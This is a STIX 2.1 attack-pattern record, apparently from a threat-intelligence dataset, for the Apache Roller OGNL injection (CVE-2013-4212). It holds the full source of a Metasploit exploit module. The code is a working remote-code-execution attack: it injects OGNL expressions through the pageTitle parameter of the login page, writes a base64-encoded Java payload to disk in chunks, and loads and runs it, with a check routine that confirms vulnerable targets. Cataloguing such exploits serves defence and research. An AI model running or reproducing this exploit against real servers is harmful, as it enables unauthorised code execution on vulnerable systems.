{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea9cc843-c724-4e39-ae6b-33dbb73220c3",
    "created": "2024-08-14T17:09:46.255694Z",
    "modified": "2024-08-14T17:09:46.255698Z",
    "name": "Apache Roller OGNL Injection",
    "description": " This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The vulnerability is due to an OGNL injection on the UIAction controller because of an insecure usage of the ActionSupport.getText method. This module has been tested successfully on Apache Roller 5.0.1 on Ubuntu 10.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_roller_ognl_injection.rb",
            "external_id": "apache_roller_ognl_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4212"
        },
        {
            "source_name": "reference",
            "url": "http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Roller OGNL Injection',\n      'Description'    => %q{\n        This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The\n        vulnerability is due to an OGNL injection on the UIAction controller because of an\n        insecure usage of the ActionSupport.getText method. This module has been tested\n        successfully on Apache Roller 5.0.1 on Ubuntu 10.04.\n      },\n      'Author'         =>\n        [\n          'Unknown', # From coverity.com / Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4212'],\n          [ 'URL', 'http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html']\n        ],\n      'Platform'      => 'java',\n      'Arch'          => ARCH_JAVA,\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          [ 'Apache Roller 5.0.1', { } ]\n        ],\n      'DisclosureDate' => '2013-10-31',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('TARGETURI', [ true, 'The path to the Apache Roller application.', \"/roller\"])\n        ])\n  end\n\n  def execute_command(cmd)\n    injection = \"%24{(%23_memberAccess[\\\"allowStaticMethodAccess\\\"]%3dtrue,CMD,'')}\"\n    injection.gsub!(/CMD/, Rex::Text::uri_encode(cmd))\n\n    vprint_status(\"Attempting to execute: #{cmd}\")\n\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path.to_s, \"roller-ui\", \"login.rol\"),\n      'encode_params' => false,\n      'vars_get' =>\n      {\n        'pageTitle' => injection\n      }\n    })\n  end\n\n  def java_upload_part(part, filename, append = 'false')\n    cmd = \"#f=new java.io.FileOutputStream('#{filename}'+#a,#{append}),\"\n    cmd << \"#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),\"\n    cmd << \"#f.close(),#a='#{@random_suffix}'\"\n    execute_command(cmd)\n  end\n\n  def exploit\n\n    print_status(\"Checking injection...\")\n\n    if check == Exploit::CheckCode::Vulnerable\n      print_good(\"Target looks vulnerable, exploiting...\")\n    else\n      print_warning(\"Target not found as vulnerable, trying anyway...\")\n    end\n\n    @random_suffix = rand_text_alphanumeric(3) # To avoid duplicate execution\n    @payload_exe = rand_text_alphanumeric(4+rand(4)) + \".jar\"\n    append = 'false'\n    jar = payload.encoded_jar.pack\n\n    chunk_length = 384 # 512 bytes when base64 encoded\n\n    parts = jar.chars.each_slice(chunk_length).map(&:join)\n    parts.each do |part|\n      java_upload_part(part, @payload_exe, append)\n      append = 'true'\n    end\n\n    register_files_for_cleanup(\"#{@payload_exe}null\", \"#{@payload_exe}#{@random_suffix}\")\n\n    cmd = \"\"\n    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,true),\"\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,false),\"\n    # create classloader\n    cmd << \"#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}'+#a).toURI().toURL()}),#a='#{rand_text_alphanumeric(4)}',\"\n    # load class\n    cmd << \"#c=#cl.loadClass('metasploit.Payload'),\"\n    # invoke main method\n    cmd << \"#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(\"\n    cmd << \"null,new java.lang.Object[]{new java.lang.String[0]})\"\n    execute_command(cmd)\n  end\n\n  def check\n    addend_one = rand_text_numeric(rand(3) + 1).to_i\n    addend_two = rand_text_numeric(rand(3) + 1).to_i\n    sum = addend_one + addend_two\n\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path.to_s, \"roller-ui\", \"login.rol\"),\n      'vars_get' =>\n        {\n          'pageTitle' => \"${new java.lang.Integer(#{addend_one}+#{addend_two})}\",\n        }\n    })\n\n    if res and res.code == 200 and res.body =~ /#{sum}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-31",
    "x_mitre_platforms": [
        "java'"
    ]
}